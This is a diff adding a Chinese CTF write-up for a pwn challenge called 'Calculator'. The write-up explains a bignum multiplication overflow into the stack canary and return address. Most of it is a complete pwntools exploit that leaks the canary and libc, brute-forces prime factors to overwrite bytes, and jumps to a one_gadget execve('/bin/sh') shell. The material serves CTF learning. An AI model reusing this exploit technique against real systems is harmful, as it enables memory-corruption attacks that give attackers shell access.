@@ -177,3 +177,171 @@ if __name__ == '__main__':
 看了樱花师傅的博客懂的，orz
 
 参考链接： [http://eternalsakura13.com/2018/04/24/starctf_babystack/](http://eternalsakura13.com/2018/04/24/starctf_babystack/)
+
+# Calculator
+
+这是当时的pwn5,阿鹏大佬的题，orz，搞了好久，最后要了ppt才解出来
+
+程序有个bignum的结构体
+```c
+struct bignum{
+	int len;
+	char* num;
+};
+```
+
+程序会根据我们输入的质数（小于255）进行相乘，然后输入's'的话会输出结果并重置bignum，输入'q'退出
+
+我们可以一直输入质数让程序做乘法，这样结果就会溢出到canary，或者返回地址，先泄露，最后覆盖返回地址的恢复canary，要注意的是，覆盖的时候要从高到低一位一位的覆盖，一步覆盖不太可能。
+
+这里主要的问题是生成符合结果的长度为n的数，考虑到 0xff = 3 * 5 * 17，所以我们可以先生成pow(0xff,n-1),pow(0xff,n-2),pow(0xff,n-3),然后爆破剩下的因子即可，爆破的时间很快，大概4-7秒左右即可覆盖返回地址为onegadget和canary
+
+```python
+from pwn import *
+
+def is_prime(n):
+	if n < 3:
+		return 0
+	else:
+		i = 2
+		while i*i <= n:
+			if n % i == 0:
+				return 0
+			i = i + 1			
+	return 1
+
+
+
+def bforce(length,value,byte=1):
+	t1 = 0xff**(length-1)
+	t2 = 0xff**(length-2)
+	t3 = 0xff**(length-3)
+	l = []
+	for i in prime:
+		if (t1*i)>>(length*8-8*byte) == value:
+			l.append(i)
+			bf(length-1,l)
+			return 1
+		
+	for i in prime:
+		for j in prime:
+			if (t2*i*j)>>(length*8-8*byte) == value:
+				l.append(i)
+				l.append(j)
+				bf(length-2,l)
+				return 1
+			if ((t1*i*j)>>(length*8-8*byte)) == value and (len(hex(t1*i*j))-3 <= length*2 and len(hex(t1*i*j))-3 > length*2-2):
+				l.append(i)
+				l.append(j)
+				bf(length-1,l)
+				return 1
+	
+	for i in prime:
+		for j in prime:
+			for k in prime:
+				if (t3*i*j*k)>>(length*8-8*byte) == value:
+					l.append(i)
+					l.append(j)
+					l.append(k)
+					bf(length-3,l)
+					return 1
+				if ((t1*i*j*k)>>(length*8-8*byte)) == value and (len(hex(t1*i*j*k))-3 <= length*2 and len(hex(t1*i*j*k))-3 > length*2-2):
+					l.append(i)
+					l.append(j)
+					l.append(k)
+					bf(length-1,l)
+					return 1
+				if ((t2*i*j*k)>>(length*8-8*byte)) == value and (len(hex(t2*i*j*k))-3 <= length*2 and len(hex(t2*i*j*k))-3 > length*2-2):
+					l.append(i)
+					l.append(j)
+					l.append(k)
+					bf(length-2,l)
+					return 1
+	return -1
+def bf(length,l):
+	for i in range(length):
+		p.recvuntil(">> ")
+		p.sendline("3")
+		p.recvuntil(">> ")
+		p.sendline("5")
+		p.recvuntil(">> ")
+		p.sendline("17")
+	for i in l:
+		p.recvuntil(">> ")
+		p.sendline(str(i))
+	p.recvuntil(">> ")
+	p.sendline("s")
+
+def main(host, port=9999):
+	global p
+	if host:
+		p = remote(host, port)
+	else:
+		p = process('./calculator')
+		# gdb.attach(p)
+	# 03:0018	   0x7ffe2a978d48 -> 0x5
+	# 04:0020      0x7ffe2a978d50 -> 0x7ffe2a978d58 -> 0xe7f52a28cb
+	# 05:0028      0x7ffe2a978d58 -> 0xe7f52a28cb
+	# 06:0030      0x7ffe2a978d60 -> 0x0
+	# 07:0038      0x7ffe2a978d68 -> 0x8933db3a9e9dee00
+	# 08:0040 rbp  0x7ffe2a978d70 -> 0x5653c4328f20 -> push   r15
+	# 09:0048      0x7ffe2a978d78 -> 0x7f7388e22830 (__libc_start_main+240) -> mov    edi, eax
+	
+	global prime
+	prime = []
+	for i in range(2,256):
+		if is_prime(i):
+			prime.append(i)
+	
+	for i in range(17):
+		p.recvuntil(">> ")
+		p.sendline("251")
+	p.recvuntil(">> ")
+	p.sendline("s")
+	p.recvuntil("Result: ")
+	canary = int(p.recv(16),16)<<8
+	
+	
+	for i in range(33):
+		p.recvuntil(">> ")
+		p.sendline("251")
+	p.recvuntil(">> ")
+	p.sendline("s")
+	p.recvuntil("Result: ")
+	libc = int(p.recv(14),16)-0x20885
+	info("libc : " + hex(libc))
+	
+	# 0x45216	execve("/bin/sh", rsp+0x30, environ)
+	# constraints:
+	# rax == NULL
+	
+	onegadget = libc + 0x45216
+	
+	
+	
+	for i in range(35,32,-1):
+		bforce(i,ord(p64(onegadget)[i-33]))
+	
+	for i in range(24,18,-1):
+		bforce(i,ord(p64(canary)[i-17]))
+	info("canary : " + hex(canary))
+	info("onegadget : " + hex(onegadget))
+	
+	
+	# 67/255 
+	if bforce(18,u16(p64(canary)[:2]),2) == -1:
+		info("fail!")
+		exit()
+	
+	p.recvuntil(">> ")
+	p.sendline("q")
+	p.interactive()
+
+
+if __name__ == '__main__':
+	
+	main(args["REMOTE"])
+	
+
+
+```
